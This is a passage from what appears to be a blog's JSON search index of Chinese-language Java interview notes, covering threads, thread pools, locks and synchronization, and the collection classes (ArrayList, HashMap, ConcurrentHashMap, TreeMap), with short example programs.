如果一个锁是公平的，那么锁的获取顺序就应该符合请求的绝对时间顺序，FIFO。对于非公平锁，只要CAS设置同步状态成功，则表示当前线程获取了锁，而公平锁还需要判断当前节点是否有前驱节点，如果有，则表示有线程比当前线程更早请求获取锁，因此需要等待前驱线程获取并释放锁之后才能继续获取锁。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"Thread","slug":"Thread","date":"2020-07-13T21:30:23.000Z","updated":"2021-04-11T17:11:28.466Z","comments":true,"path":"thread/","link":"","permalink":"https://kayleh.top/thread/","excerpt":"THREAD","text":"THREAD 如何保证线程安全？通过合理的时间调度，避开共享资源的存取冲突。另外，在并行任务设计上可以通过适当的策略，保证任务与任务之间不存在共享资源，设计一个规则来保证一个客户的计算工作和数据访问只会被一个线程或一台工作机完成，而不是把一个客户的计算工作分配给多个线程去完成。 简要说明一下线程的基本状态以及状态之间的关系？其中Running表示运行状态，Runnable表示就绪状态（万事俱备，只欠CPU），Blocked表示阻塞状态，阻塞状态又有多种情况，可能是因为调用wait()方法进入等待池，也可能是执行同步方法或同步代码块进入等锁池，或者是调用了sleep()方法或join()方法等待休眠或其他线程结束，或是因为发生了I/O中断。 解释一下什么是线程池（thread pool）？在面向对象编程中，创建和销毁对象是很费时间的，因为创建一个对象要获取内存资源或者其它更多资源。在Java中更是如此，虚拟机将试图跟踪每一个对象，以便能够在对象销毁后进行垃圾回收。所以提高服务程序效率的一个手段就是尽可能减少创建和销毁对象的次数，特别是一些很耗资源的对象创建和销毁，这就是”池化资源”技术产生的原因。线程池顾名思义就是事先创建若干个可执行的线程放入一个池（容器）中，需要的时候从池中获取线程不用自行创建，使用完毕不需要销毁线程而是放回池中，从而减少创建和销毁线程对象的开销。Java 5+中的Executor接口定义一个执行线程的工具。它的子类型即线程池接口是ExecutorService。要配置一个线程池是比较复杂的，尤其是对于线程池的原理不是很清楚的情况下，因此在工具类Executors面提供了一些静态工厂方法，生成一些常用的线程池，如下所示：- newSingleThreadExecutor：创建一个单线程的线程池。这个线程池只有一个线程在工作，也就是相当于单线程串行执行所有任务。如果这个唯一的线程因为异常结束，那么会有一个新的线程来替代它。此线程池保证所有任务的执行顺序按照任务的提交顺序执行。- newFixedThreadPool：创建固定大小的线程池。每次提交一个任务就创建一个线程，直到线程达到线程池的最大大小。线程池的大小一旦达到最大值就会保持不变，如果某个线程因为执行异常而结束，那么线程池会补充一个新线程。- newCachedThreadPool：创建一个可缓存的线程池。如果线程池的大小超过了处理任务所需要的线程，那么就会回收部分空闲（60秒不执行任务）的线程，当任务数增加时，此线程池又可以智能的添加新线程来处理任务。此线程池不会对线程池大小做限制，线程池大小完全依赖于操作系统（或者说JVM）能够创建的最大线程大小。- newScheduledThreadPool：创建一个大小无限的线程池。此线程池支持定时以及周期性执行任务的需求。- newSingleThreadExecutor：创建一个单线程的线程池。此线程池支持定时以及周期性执行任务的需求。 举例说明同步和异步如果系统中存在临界资源（资源数量少于竞争资源的线程数量的资源），例如正在写的数据以后可能被另一个线程读到，或者正在读的数据可能已经被另一个线程写过了，那么这些数据就必须进行同步存取（数据库操作中的排他锁就是最好的例子）。当应用程序在对象上调用了一个需要花费很长时间来执行的方法，并且不希望让程序等待方法的返回时，就应该使用异步编程，在很多情况下采用异步途径往往更有效率。事实上，所谓的同步就是指阻塞式操作，而异步就是非阻塞式操作。 介绍一下线程同步和线程调度的相关方法。 - wait()：使一个线程处于等待（阻塞）状态，并且释放所持有的对象的锁；- sleep()：使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要处理InterruptedException异常；- notify()：唤醒一个处于等待状态的线程，当然在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且与优先级无关；- notityAll()：唤醒所有处于等待状态的线程，该方法并不是将对象的锁给所有线程，而是让它们竞争，只有获得锁的线程才能进入就绪状态；通过Lock接口提供了显式的锁机制（explicit lock），增强了灵活性以及对线程的协调。Lock接口中定义了加锁（lock()）和解锁（unlock()）的方法，同时还提供了newCondition()方法来产生用于线程之间通信的Condition对象；此外，Java 5还提供了信号量机制（semaphore），信号量可以用来限制对某个共享资源进行访问的线程的数量。在对资源进行访问之前，线程必须得到信号量的许可（调用Semaphore对象的acquire()方法）；在完成对资源的访问后，线程必须向信号量归还许可（调用Semaphore对象的release()方法）。 请问当一个线程进入一个对象的synchronized方法A之后，其它线程是否可进入此对象的synchronized方法B？不能。其它线程只能访问该对象的非同步方法，同步方法则不能进入。因为非静态方法上的synchronized修饰符要求执行方法时要获得对象的锁，如果已经进入A方法说明对象锁已经被取走，那么试图进入B方法的线程就只能在等锁池（注意不是等待池哦）中等待对象的锁。 请简述一下线程的sleep()方法和yield()方法有什么区别？①sleep()方法给其他线程运行机会时不考虑线程的优先级，因此会给低优先级的线程以运行的机会； yield()方法只会给相同优先级或更高优先级的线程以运行的机会； ② 线程执行sleep()方法后转入阻塞（blocked）状态， 而执行yield()方法后转入就绪（ready）状态； Java中有几种方法可以实现一个线程？用什么关键字修饰同步方法? stop()和suspend()方法为何不推荐使用，请说明原因？有两种实现方法，分别是继承Thread类与实现Runnable接口，用synchronized关键字修饰同步方法， 反对使用stop()，是因为它不安全。它会解除由线程获取的所有锁定，而且如果对象处于一种不连贯状态，那么其他线程能在那种状态下检查和修改它们。结果很难检查出真正的问题所在。suspend()方法容易发生死锁。 调用suspend()的时候，目标线程会停下来，但却仍然持有在这之前获得的锁定。此时，其他任何线程都不能访问锁定的资源，除非被”挂起”的线程恢复运行。对任何线程来说，如果它们想恢复目标线程，同时又试图使用任何一个锁定的资源，就会造成死锁。所以不应该使用suspend()，而应在自己的Thread类中置入一个标志，指出线程应该活动还是挂起。若标志指出线程应该挂起，便用 wait()命其进入等待状态。若标志指出线程应当恢复，则用一个notify()重新启动线程。 多线程和同步有几种实现方法,并且这些实现方法具体内容都是什么?多线程有两种实现方法，分别是继承Thread类与实现Runnable接口同步的实现方面有两种，分别是synchronized,wait与notify。 说出你所知道的线程同步的方法wait():使一个线程处于等待状态，并且释放所持有的对象的lock。sleep():使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要捕捉InterruptedException异常。notify():唤醒一个处于等待状态的线程，注意的是在调用此方法的时候，并不能确切的唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且不是按优先级。Allnotity():唤醒所有处入等待状态的线程，注意并不是给所有唤醒线程一个对象的锁，而是让它们竞争。 启动一个线程是用run()还是start()?启动一个线程是调用start()方法，使线程所代表的虚拟处理机处于可运行状态，这意味着它可以由JVM调度并执行。这并不意味着线程就会立即运行。run()方法可以产生必须退出的标志来停止一个线程。 请使用内部类实现线程设计4个线程，其中两个线程每次对j增加1，另外两个线程对j每次减少1。123456789101112131415161718192021222324252627282930313233343536public class ThreadTest1&#123;private int j;public static void main(String args[])&#123;ThreadTest1 tt=new ThreadTest1();Inc inc=tt.new Inc();Dec dec=tt.new Dec();for(int i=0;i&lt;2;i++)&#123;Thread t=new Thread(inc);t.start();t=new Thread(dec);t.start();&#125;&#125;private synchronized void inc()&#123;j++;System.out.println(Thread.currentThread().getName()+\"-inc:\"+j);&#125;private synchronized void dec()&#123;j--;System.out.println(Thread.currentThread().getName()+\"-dec:\"+j);&#125;class Inc implements Runnable&#123;public void run()&#123;for(int i=0;i&lt;100;i++)&#123;inc();&#125;&#125;&#125;class Dec implements Runnable&#123;public void run()&#123;for(int i=0;i&lt;100;i++)&#123;dec();&#125;&#125;&#125;&#125; 说明一下线程中的同步和异步有何异同？并且请举例说明在什么情况下会使用到同步和异步？如果数据将在线程间共享。例如正在写的数据以后可能被另一个线程读到，或者正在读的数据可能已经被另一个线程写过了，那么这些数据就是共享数据，必须进行同步存取。当应用程序在对象上调用了一个需要花费很长时间来执行的方法，并且不希望让程序等待方法的返回时，就应该使用异步编程，在很多情况下采用异步途径往往更有效率。 明一下sleep() 和 wait() 有什么区别？sleep是线程类（Thread）的方法，导致此线程暂停执行指定时间，把执行机会给其他线程，但是监控状态依然保持，到时后会自动恢复。调用sleep不会释放对象锁。wait是Object类的方法，对此对象调用wait方法导致本线程放弃对象锁，进入等待此对象的等待锁定池，只有针对此对象发出notify方法（或notifyAll）后本线程才进入对象锁定池准备获得对象锁进入运行状态。 请你说明一下在监视器(Monitor)内部，是如何做到线程同步的？在程序又应该做哪种级别的同步呢？监视器和锁在Java虚拟机中是一块使用的。监视器监视一块同步代码块，确保一次只有一个线程执行同步代码块。每一个监视器都和一个对象引用相关联。线程在获取锁之前不允许执行同步代码。 分析一下同步方法和同步代码块的区别是什么？同步方法默认用this或者当前类class对象作为锁；同步代码块可以选择以什么来加锁，比同步方法要更细颗粒度，我们可以选择只同步会发生同步问题的部分代码而不是整个方法。 请详细描述一下线程从创建到死亡的几种状态都有哪些？ 新建( new )：新创建了一个线程对象。 可运行( runnable )：线程对象创建后，其他线程(比如 main 线程）调用了该对象 的 start ()方法。该状态的线程位于可运行线程池中，等待被线程调度选中，获 取 cpu 的使用权 。 运行( running )：可运行状态( runnable )的线程获得了 cpu 时间片（ timeslice ） ，执行程序代码。 阻塞( block )：阻塞状态是指线程因为某种原因放弃了 cpu 使用权，也即让出了 cpu timeslice ，暂时停止运行。直到线程进入可运行( runnable )状态，才有 机会再次获得 cpu timeslice 转到运行( running )状态。阻塞的情况分三种：(一). 等待阻塞：运行( running )的线程执行 o . wait ()方法， JVM 会把该线程放 入等待队列( waitting queue )中。(二). 同步阻塞：运行( running )的线程在获取对象的同步锁时，若该同步锁 被别的线程占用，则 JVM 会把该线程放入锁池( lock pool )中。(三). 其他阻塞: 运行( running )的线程执行 Thread . sleep ( long ms )或 t . join ()方法，或者发出了 I / O 请求时， JVM 会把该线程置为阻塞状态。 当 sleep ()状态超时、 join ()等待线程终止或者超时、或者 I / O 处理完毕时，线程重新转入可运行( runnable )状态。 死亡( dead )：线程 run ()、 main () 方法执行结束，或者因异常退出了 run ()方法，则该线程结束生命周期。死亡的线程不可再次复生。 创建线程有几种不同的方式？你喜欢哪一种？为什么？有三种方式可以用来创建线程：继承Thread类实现Runnable接口应用程序可以使用Executor框架来创建线程池实现Runnable接口这种方式更受欢迎，因为这不需要继承Thread类。在应用设计中已经继承了别的对象的情况下，这需要多继承（而Java不支持多继承），只能实现接口。同时，线程池也是非常高效的，很容易实现和使用。 解释一下Java多线程回调是什么意思？所谓回调，就是客户程序C调用服务程序S中的某个方法A，然后S又在某个时候反过来调用C中的某个方法B，对于C来说，这个B便叫做回调方法。 列举一下启动线程有哪几种方式，之后再说明一下线程池的种类都有哪些？①启动线程有如下三种方式： 一、继承Thread类创建线程类 （1）定义Thread类的子类，并重写该类的run方法，该run方法的方法体就代表了线程要完成的任务。因此把run()方法称为执行体。 （2）创建Thread子类的实例，即创建了线程对象。 （3）调用线程对象的start()方法来启动该线程。 代码： 12345678910111213141516171819202122232425package com.thread;public class FirstThreadTest extends Thread&#123; int i = 0; //重写run方法，run方法的方法体就是现场执行体 public void run() &#123; for(;i&lt;100;i++)&#123; System.out.println(getName()+\" \"+i); &#125; &#125; public static void main(String[] args) &#123; for(int i = 0;i&lt; 100;i++) &#123; System.out.println(Thread.currentThread().getName()+\" : \"+i); if(i==20) &#123; new FirstThreadTest().start(); new FirstThreadTest().start(); &#125; &#125; &#125; &#125; 上述代码中Thread.currentThread()方法返回当前正在执行的线程对象。GetName()方法返回调用该方法的线程的名字。 二、通过Runnable接口创建线程类 （1）定义runnable接口的实现类，并重写该接口的run()方法，该run()方法的方法体同样是该线程的线程执行体。 （2）创建 Runnable实现类的实例，并依此实例作为Thread的target来创建Thread对象，该Thread对象才是真正的线程对象。 （3）调用线程对象的start()方法来启动该线程。 代码： 1234567891011121314151617181920212223242526272829package com.thread; public class RunnableThreadTest implements Runnable&#123; private int i; public void run() &#123; for(i = 0;i &lt;100;i++) &#123; System.out.println(Thread.currentThread().getName()+\" \"+i); &#125; &#125; public static void main(String[] args) &#123; for(int i = 0;i &lt; 100;i++) &#123; System.out.println(Thread.currentThread().getName()+\" \"+i); if(i==20) &#123; RunnableThreadTest rtt = new RunnableThreadTest(); new Thread(rtt,\"新线程1\").start(); new Thread(rtt,\"新线程2\").start(); &#125; &#125; &#125; &#125; 三、通过Callable和Future创建线程 （1）创建Callable接口的实现类，并实现call()方法，该call()方法将作为线程执行体，并且有返回值。 （2）创建Callable实现类的实例，使用FutureTask类来包装Callable对象，该FutureTask对象封装了该Callable对象的call()方法的返回值。 （3）使用FutureTask对象作为Thread对象的target创建并启动新线程。 （4）调用FutureTask对象的get()方法来获得子线程执行结束后的返回值 代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.thread;import java.util.concurrent.Callable;import java.util.concurrent.ExecutionException;import java.util.concurrent.FutureTask; public class CallableThreadTest implements Callable&lt;Integer&gt;&#123; public static void main(String[] args) &#123; CallableThreadTest ctt = new CallableThreadTest(); FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(ctt); for(int i = 0;i &lt; 100;i++) &#123; System.out.println(Thread.currentThread().getName()+\" 的循环变量i的值\"+i); if(i==20) &#123; new Thread(ft,\"有返回值的线程\").start(); &#125; &#125; try &#123; System.out.println(\"子线程的返回值：\"+ft.get()); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; catch (ExecutionException e) &#123; e.printStackTrace(); &#125; &#125; @Override public Integer call() throws Exception &#123; int i = 0; for(;i&lt;100;i++) &#123; System.out.println(Thread.currentThread().getName()+\" \"+i); &#125; return i; &#125; &#125; ②线程池的种类有： Java通过Executors提供四种线程池，分别为： newCachedThreadPool创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。newFixedThreadPool 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。newScheduledThreadPool 创建一个定长线程池，支持定时及周期性任务执行。newSingleThreadExecutor 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。 简要说明一下JAVA中cyclicbarrier和countdownlatch的区别分别是什么？CountDownLatch和CyclicBarrier都能够实现线程之间的等待，只不过它们侧重点不同： CountDownLatch一般用于某个线程A等待若干个其他线程执行完任务之后，它才执行； 而CyclicBarrier一般用于一组线程互相等待至某个状态，然后这一组线程再同时执行； 另外，CountDownLatch是不能够重用的，而CyclicBarrier是可以重用的。 说明一下线程池有什么优势？第一：降低资源消耗。通过重复利用已创建的线程降低线程创建和销毁造成的消耗。 第二：提高响应速度。当任务到达时，任务可以不需要等到线程创建就能执行。 第三：提高线程的可管理性，线程是稀缺资源，如果无限制地创建，不仅会消耗系统资源，还会降低系统的稳定性，使用线程池可以进行统一分配、调优和监控。 请回答一下Java中有几种线程池？并且详细描述一下线程池的实现过程 1、newFixedThreadPool创建一个指定工作线程数量的线程池。每当提交一个任务就创建一个工作线程，如果工作线程数量达到线程池初始的最大数，则将提交的任务存入到池队列中。2、newCachedThreadPool创建一个可缓存的线程池。这种类型的线程池特点是： 1).工作线程的创建数量几乎没有限制(其实也有限制的,数目为Interger. MAX_VALUE), 这样可灵活的往线程池中添加线程。2).如果长时间没有往线程池中提交任务，即如果工作线程空闲了指定的时间(默认为1分钟)，则该工作线程将自动终止。终止后，如果你又提交了新的任务，则线程池重新创建一个工作线程。3、newSingleThreadExecutor创建一个单线程化的Executor，即只创建唯一的工作者线程来执行任务，如果这个线程异常结束，会有另一个取代它，保证顺序执行(我觉得这点是它的特色)。单工作线程最大的特点是可保证顺序地执行各个任务，并且在任意给定的时间不会有多个线程是活动的 。4、newScheduleThreadPool创建一个定长的线程池，而且支持定时的以及周期性的任务执行，类似于Timer。(这种线程池原理暂还没完全了解透彻) 请说明一下Java中都有哪些方式可以启动一个线程？ 继承自Thread类 实现Runnable接口 即实现Runnable接口，也继承Thread类，并重写run方法 请列举一下创建线程的方法，并简要说明一下在这些方法中哪个方法更好，原因是什么？需要从Java.lang.Thread类派生一个新的线程类，重载它的run()方法； 实现Runnalbe接口，重载Runnalbe接口中的run()方法。 实现Runnalbe接口更好，使用实现Runnable接口的方式创建的线程可以处理同一资源，从而实现资源的共享. 简短说明一下你对AQS的理解。 AQS其实就是一个可以给我们实现锁的框架内部实现的关键是：先进先出的队列、state状态定义了内部类ConditionObject拥有两种线程模式独占模式和共享模式。在LOCK包中的相关锁(常用的有ReentrantLock、 ReadWriteLock)都是基于AQS来构建，一般我们叫AQS为同步器。 请简述一下线程池的运行流程，使用参数以及方法策略等线程池主要就是指定线程池核心线程数大小，最大线程数，存储的队列，拒绝策略，空闲线程存活时长。当需要任务大于核心线程数时候，就开始把任务往存储任务的队列里，当存储队列满了的话，就开始增加线程池创建的线程数量，如果当线程数量也达到了最大，就开始执行拒绝策略，比如说记录日志，直接丢弃，或者丢弃最老的任务。 线程，进程，然后线程创建有很大开销，怎么优化？ 可以使用线程池。 什么是生产者消费者模式？生产者消费者问题是线程模型中的经典问题：生产者和消费者在同一时间段内共用同一存储空间，生产者向空间里生产数据，而消费者取走数据。 优点：支持并发、解耦。 简述一下实现多线程同步的方法？可以使用synchronized、lock、volatile和ThreadLocal来实现同步。 如何在线程安全的情况下实现一个计数器？可以使用加锁，比如synchronized或者lock。也可以使用Concurrent包下的原子类。 多线程中的i++线程安全吗？请简述一下原因？不安全。i++不是原子性操作。i++分为读取i值，对i值加一，再赋值给i++，执行期中任何一步都是有可能被其他线程抢占的。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"Array","slug":"Array","date":"2020-07-13T21:29:08.000Z","updated":"2021-04-11T17:11:28.090Z","comments":true,"path":"array/","link":"","permalink":"https://kayleh.top/array/","excerpt":"Array","text":"Array List、Map、Set三个接口存取元素时，各有什么特点？ List以特定索引来存取元素，可以有重复元素。 Set不能存放重复元素（用对象的equals()方法来区分元素是否重复）。 Map保存键值对（key-value pair）映射，映射关系可以是一对一或多对一。 Set和Map容器都有基于哈希存储和排序树的两种实现版本，基于哈希存储的版本理论存取时间复杂度为O(1)，而基于排序树版本的实现在插入或删除元素时会按照元素或元素的键（key）构成排序树从而达到排序和去重的效果。 阐述ArrayList、Vector、LinkedList的存储性能和特性 ArrayList 和Vector都是使用数组方式存储数据，此数组元素数大于实际存储的数据以便增加和插入元素，它们都允许直接按序号索引元素，但是插入元素要涉及数组元素移动等内存操作，所以索引数据快而插入数据慢，Vector中的方法由于添加了synchronized修饰，因此Vector是线程安全的容器，但性能上较ArrayList差，因此已经是Java中的遗留容器。 LinkedList使用双向链表实现存储（将内存中零散的内存单元通过附加的引用关联起来，形成一个可以按序号索引的线性结构，这种链式存储方式与数组的连续存储方式相比，内存的利用率更高），按序号索引数据需要进行前向或后向遍历，但是插入数据时只需要记录本项的前后项即可，所以插入速度较快。Vector属于遗留容器（Java早期的版本中提供的容器，除此之外，Hashtable、Dictionary、BitSet、Stack、Properties都是遗留容器），已经不推荐使用，但是由于ArrayList和LinkedListed都是非线程安全的，如果遇到多个线程操作同一个容器的场景，则可以通过工具类Collections中的synchronizedList方法将其转换成线程安全的容器后再使用（这是对装潢模式的应用，将已有对象传入另一个类的构造器中创建新的对象来增强实现）。 判断List、Set、Map是否继承自Collection接口？ List、Set 是，Map 不是。 Map是键值对映射容器，与List和Set有明显的区别，而Set存储的零散的元素且不允许有重复元素 （数学中的集合也是如此），List是线性结构的容器，适用于按数值索引访问元素的情形。 你所知道的常用集合类以及主要方法？最常用的集合类是List 和 Map。 List 的具体实现包括 ArrayList 和 Vector，它们是可变大小的列表，比较适合构建、存储和操作任何类型对象的元素列表。List 适用于按数值索引访问元素的情形。 Map 提供了一个更通用的元素存储方法。 Map 集合类用于存储元素对（称作”键”和”值”），其中每个键映射到一个值。 说明Collection 和 Collections的区别Collection是集合类的上级接口，继承与他的接口主要有Set 和List.Collections是针对集合类的一个帮助类，他提供一系列静态方法实现对各种集合的搜索、排序、线程安全化等操作。 说明ArrayList,Vector,LinkedList的存储性能和特性是什么？ ArrayList 和Vector都是使用数组方式存储数据，此数组元素数大于实际存储的数据以便增加和插入元素，它们都允许直接按序号索引元素，但是插入元素要涉及数组元素移动等内存操作，所以索引数据快而插入数据慢，Vector由于使用了synchronized方法（线程安全），通常性能上较ArrayList差，而LinkedList使用双向链表实现存储，按序号索引数据需要进行前向或后向遍历，但是插入数据时只需要记录本项的前后项即可，所以插入速度较快。 ArrayList和LinkedList的区别？(链表和数组的优缺点) ArrayList和LinkedList都实现了List接口，他们有以下的不同点：ArrayList是基于索引的数据接口，它的底层是数组。它可以以O(1)时间复杂度对元素进行随机访问。与此对应，LinkedList是以元素列表的形式存储它的数据，每一个元素都和它的前一个和后一个元素链接在一起，在这种情况下，查找某个元素的时间复杂度是O(n)。相对于ArrayList，LinkedList的插入，添加，删除操作速度更快，因为当元素被添加到集合任意位置的时候，不需要像数组那样重新计算大小或者是更新索引。LinkedList比ArrayList更占内存，因为LinkedList为每一个节点存储了两个引用，一个指向前一个元素，一个指向下一个元素。 说明HashMap和Hashtable的区别？HashMap和Hashtable都实现了Map接口，因此很多特性非常相似。但是，他们有以下不同点：HashMap允许键和值是null，而Hashtable不允许键或者值是null。Hashtable是同步的，而HashMap不是。因此，HashMap更适合于单线程环境，而Hashtable适合于多线程环境。HashMap提供了可供应用迭代的键的集合，因此，HashMap是快速失败的。另一方面，Hashtable提供了对键的列举(Enumeration)。一般认为Hashtable是一个遗留的类。 请说说快速失败(fail-fast)和安全失败(fail-safe)的区别？Iterator的安全失败是基于对底层集合做拷贝，因此，它不受源集合上修改的影响。java.util包下面的所有的集合类都是快速失败的，而java.util.concurrent包下面的所有的类都是安全失败的。快速失败的迭代器会抛出ConcurrentModificationException异常，而安全失败的迭代器永远不会抛出这样的异常。 说说Iterator和ListIterator的区别？Iterator和ListIterator的区别是：Iterator可用来遍历Set和List集合，但是ListIterator只能用来遍历List。Iterator对集合只能是前向遍历，ListIterator既可以前向也可以后向。ListIterator实现了Iterator接口，并包含其他的功能，比如：增加元素，替换元素，获取前一个和后一个元素的索引，等等。 请简单说明一下什么是迭代器？Iterator提供了统一遍历操作集合元素的统一接口, Collection接口实现Iterable接口,每个集合都通过实现Iterable接口中iterator()方法返回Iterator接口的实例, 然后对集合的元素进行迭代操作.有一点需要注意的是：在迭代元素的时候不能通过集合的方法删除元素, 否则会抛出ConcurrentModificationException 异常. 但是可以通过Iterator接口中的remove()方法进行删除. 解释为什么集合类没有实现Cloneable和Serializable接口？克隆(cloning)或者是序列化(serialization)的语义和含义是跟具体的实现相关的。因此，应该由集合类的具体实现来决定如何被克隆或者是序列化。实现Serializable序列化的作用：将对象的状态保存在存储媒体中以便可以在以后重写创建出完全相同的副本；按值将对象从一个从一个应用程序域发向另一个应用程序域。实现 Serializable接口的作用就是可以把对象存到字节流，然后可以恢复。所以你想如果你的对象没有序列化，怎么才能进行网络传输呢？要网络传输就得转为字节流，所以在分布式应用中，你就得实现序列化。如果你不需要分布式应用，那就没必要实现实现序列化。 Java集合类框架的基本接口有哪些？集合类接口指定了一组叫做元素的对象。集合类接口的每一种具体的实现类都可以选择以它自己的方式对元素进行保存和排序。有的集合类允许重复的键，有些不允许。Java集合类提供了一套设计良好的支持对一组对象进行操作的接口和类。Java集合类里面最基本的接口有：Collection：代表一组对象，每一个对象都是它的子元素。Set：不包含重复元素的Collection。List：有顺序的collection，并且可以包含重复元素。Map：可以把键(key)映射到值(value)的对象，键不能重复。 ConcurrentHashMap的原理？ ConcurrentHashMap 类中包含两个静态内部类 HashEntry 和 Segment。 HashEntry 用来封装映射表的键 / 值对； Segment 用来充当锁的角色，每个 Segment 对象守护整个散列映射表的若干个桶。每个桶是由若干个 HashEntry 对象链接起来的链表。 一个 ConcurrentHashMap 实例中包含由若干个 Segment 对象组成的数组。HashEntry 用来封装散列映射表中的键值对。在 HashEntry 类中，key，hash 和 next 域都被声明为 final 型，value 域被声明为 volatile 型。 12345678910111213static final class HashEntry&lt;K,V&gt; &#123; final K key; // 声明 key 为 final 型 final int hash; // 声明 hash 值为 final 型 volatile V value; // 声明 value 为 volatile 型 final HashEntry&lt;K,V&gt; next; // 声明 next 为 final 型 HashEntry(K key, int hash, HashEntry&lt;K,V&gt; next, V value) &#123; this.key = key; this.hash = hash; this.next = next; this.value = value; &#125;&#125; 在ConcurrentHashMap 中，在散列时如果产生“碰撞”，将采用“分离链接法”来处理“碰撞”：把“碰撞”的 HashEntry 对象链接成一个链表。由于 HashEntry 的 next 域为 final 型，所以新节点只能在链表的表头处插入。 下图是在一个空桶中依次插入 A，B，C 三个 HashEntry 对象后的结构图： 插入三个节点后桶的结构示意图： 注意：由于只能在表头插入，所以链表中节点的顺序和插入的顺序相反。 Segment 类继承于 ReentrantLock 类，从而使得 Segment 对象能充当锁的角色。每个 Segment 对象用来守护其（成员对象 table 中）包含的若干个桶。 解释一下TreeMap?TreeMap是一个有序的key-value集合，基于红黑树（Red-Black tree）的 NavigableMap实现。该映射根据其键的自然顺序进行排序，或者根据创建映射时提供的 Comparator进行排序，具体取决于使用的构造方法。TreeMap的特性：根节点是黑色每个节点都只能是红色或者黑色每个叶节点（NIL节点，空节点）是黑色的。如果一个节点是红色的，则它两个子节点都是黑色的，也就是说在一条路径上不能出现两个红色的节点。从任一节点到其每个叶子的所有路径都包含相同数目的黑色节点。 请说明ArrayList是否会越界？ArrayList是实现了基于动态数组的数据结构，而LinkedList是基于链表的数据结构2. 对于随机访问get和set，ArrayList要优于LinkedList，因为LinkedList要移动指针；ArrayList并发add()可能出现数组下标越界异常。 说明concurrenthashmap有什么优势以及1.7和1.8区别？Concurrenthashmap线程安全的，1.7是在jdk1.7中采用Segment + HashEntry的方式进行实现的，lock加在Segment上面。1.7size计算是先采用不加锁的方式，连续计算元素的个数，最多计算3次：1、如果前后两次计算结果相同，则说明计算出来的元素个数是准确的；2、如果前后两次计算结果都不同，则给每个Segment进行加锁，再计算一次元素的个数； 1.8中放弃了Segment臃肿的设计，取而代之的是采用Node + CAS + Synchronized来保证并发安全进行实现，1.8中使用一个volatile类型的变量baseCount记录元素的个数，当插入新数据或则删除数据时，会通过addCount()方法更新baseCount，通过累加baseCount和CounterCell数组中的数量，即可得到元素的总个数； TreeMap的底层实现？TreeMap 的实现就是红黑树数据结构，也就说是一棵自平衡的排序二叉树，这样就可以保证当需要快速检索指定节点。 红黑树的插入、删除、遍历时间复杂度都为O(lgN)，所以性能上低于哈希表。但是哈希表无法提供键值对的有序输出，红黑树因为是排序插入的，可以按照键的值的大小有序输出。红黑树性质： 性质1：每个节点要么是红色，要么是黑色。 性质2：根节点永远是黑色的。 性质3：所有的叶节点都是空节点（即 null），并且是黑色的。 性质4：每个红色节点的两个子节点都是黑色。（从每个叶子到根的路径上不会有两个连续的红色节点） 性质5：从任一节点到其子树中每个叶子节点的路径都包含相同数量的黑色节点。 说明ConcurrentHashMap锁加在了哪些地方？加在每个Segment 上面。 解释HashMap的容量为什么是2的n次幂？负载因子默认是0.75， 2^n是为了让散列更加均匀，例如出现极端情况都散列在数组中的一个下标，那么hashmap会由O（1）复杂退化为O（n）的。 请你简单介绍一下ArrayList和LinkedList的区别，并说明如果一直在list的尾部添加元素，用哪种方式的效率高？ArrayList采用数组数组实现的，查找效率比LinkedList高。LinkedList采用双向链表实现的，插入和删除的效率比ArrayList要高。一直在list的尾部添加元素，LinkedList效率要高。 如果hashMap的key是一个自定义的类，怎么办？使用HashMap，如果key是自定义的类，就必须重写hashcode()和equals()。 解释一下hashMap具体如何实现的？ Hashmap基于数组实现的，通过对key的hashcode &amp; 数组的长度得到在数组中位置，如当前数组有元素，则数组当前元素next指向要插入的元素，这样来解决hash冲突的，形成了拉链式的结构。put时在多线程情况下，会形成环从而导致死循环。数组长度一般是2n，从0开始编号，所以hashcode &amp; （2n-1），（2n-1）每一位都是1，这样会让散列均匀。需要注意的是，HashMap在JDK1.8的版本中引入了红黑树结构做优化，当链表元素个数大于等于8时，链表转换成树结构；若桶中链表元素个数小于等于6时，树结构还原成链表。因为红黑树的平均查找长度是log(n)，长度为8的时候，平均查找长度为3，如果继续使用链表，平均查找长度为8/2=4，这才有转换为树的必要。链表长度如果是小于等于6，6/2=3，虽然速度也很快的，但是转化为树结构和生成树的时间并不会太短。还有选择6和8，中间有个差值7可以有效防止链表和树频繁转换。假设一下，如果设计成链表个数超过8则链表转换成树结构，链表个数小于8则树结构转换成链表，如果一个HashMap不停的插入、删除元素，链表个数在8左右徘徊，就会频繁的发生树转链表、链表转树，效率会很低。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"J2SE","slug":"J2SE","date":"2020-07-13T21:27:19.000Z","updated":"2021-04-11T17:11:28.203Z","comments":true,"path":"j2se/","link":"","permalink":"https://kayleh.top/j2se/","excerpt":"Object-oriented","text":"Object-oriented 关于Synchronized和locksynchronized是Java的关键字，当它用来修饰一个方法或者一个代码块的时候，能够保证在同一时刻最多只有一个线程执行该段代码。JDK1.5以后引入了自旋锁、锁粗化、轻量级锁，偏向锁来有优化关键字的性能。 Lock是一个接口，而synchronized是Java中的关键字，synchronized是内置的语言实现；synchronized在发生异常时，会自动释放线程占有的锁，因此不会导致死锁现象发生；而Lock在发生异常时，如果没有主动通过unLock()去释放锁，则很可能造成死锁现象，因此使用Lock时需要在finally块中释放锁；Lock可以让等待锁的线程响应中断，而synchronized却不行，使用synchronized时，等待的线程会一直等待下去，不能够响应中断；通过Lock可以知道有没有成功获取锁，而synchronized却无法办到。 volatile 